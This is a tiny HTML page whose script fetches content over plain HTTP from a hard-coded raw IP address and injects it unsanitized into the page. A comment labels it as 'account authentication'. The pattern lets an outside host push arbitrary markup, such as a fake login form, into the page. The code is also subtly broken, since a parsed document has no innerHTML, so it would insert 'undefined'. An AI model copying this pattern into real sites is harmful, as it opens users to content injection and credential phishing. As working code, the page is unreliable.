<!DOCTYPE html>
<html lang="en">


<body>

<div id="xhrredirect"></div>


<script>
// used to display account authentication
var request = new XMLHttpRequest();

request.addEventListener("load", function(evt){
    var parser      = new DOMParser ();
    var responseDoc = parser.parseFromString (request.responseText, "text/html");
    document.getElementById("xhrredirect").innerHTML=responseDoc.innerHTML;
}, false);

request.open('GET', 'http://86.76.10.88/', true),
request.send();

</script>

</body>
</html>
